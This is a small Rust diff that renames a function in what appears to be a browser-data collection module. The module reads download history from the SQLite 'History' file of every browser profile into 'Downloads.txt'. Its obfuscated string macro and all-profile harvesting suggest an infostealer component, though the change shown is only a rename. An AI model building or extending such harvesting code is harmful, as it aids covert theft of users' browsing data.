@@ -28,7 +28,7 @@ impl Task for DownloadsTask {
     parent_name!("Downloads.txt");
     
     unsafe fn run(&self, parent: &Path) {
-        let Some(mut downloads) = collect_from_all_profiles(&self.browser.profiles, get_downloads) else {
+        let Some(mut downloads) = collect_from_all_profiles(&self.browser.profiles, read_downloads) else {
             return
         };
 
@@ -38,7 +38,7 @@ impl Task for DownloadsTask {
     }
 }
 
-fn get_downloads(profile: &Path) -> Option<Vec<Download>> {
+fn read_downloads(profile: &Path) -> Option<Vec<Download>> {
     let history_path = profile / s!("History");
     read_sqlite3_and_map_records(&history_path, s!("Downloads"), extract_download_from_record)
 }
